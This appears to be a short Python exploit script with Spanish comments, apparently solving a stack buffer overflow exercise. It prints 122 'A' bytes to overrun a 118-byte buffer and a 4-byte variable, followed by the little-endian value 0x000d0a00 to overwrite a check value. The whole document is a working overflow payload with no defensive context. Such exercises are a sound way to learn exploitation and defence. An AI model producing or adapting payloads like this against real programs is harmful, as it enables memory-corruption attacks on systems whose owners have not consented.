import sys

# 122 bytes de relleno para llenar buf (118) y examen (4)
padding = 'A' * 122

# El valor 0x000d0a00 en orden Little-Endian
cookie = '\x00\x0a\x0d\x00'

# Escribimos el payload final en la salida estándar
sys.stdout.write(padding + cookie)